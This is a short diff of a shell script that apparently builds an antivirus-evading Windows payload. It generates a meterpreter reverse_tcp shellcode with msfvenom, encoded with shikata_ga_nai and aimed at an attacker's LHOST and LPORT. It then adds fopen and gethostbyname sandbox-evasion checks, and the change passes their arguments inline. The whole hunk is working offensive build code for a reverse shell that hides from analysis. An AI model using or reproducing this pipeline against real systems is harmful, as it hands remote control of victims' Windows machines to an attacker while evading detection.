@@ -36,9 +36,8 @@ LHOST=$GLOBAL_LHOST
 msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > input/sc_raw.txt
 
 # add evasion techniques
-add_evasion fopen_sandbox_evasion
-printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include
-add_evasion gethostbyname_sandbox_evasion
+add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
+add_evasion gethostbyname_sandbox_evasion 'this.that'
 reset_evasion_technique_counter
 
 # generate key file
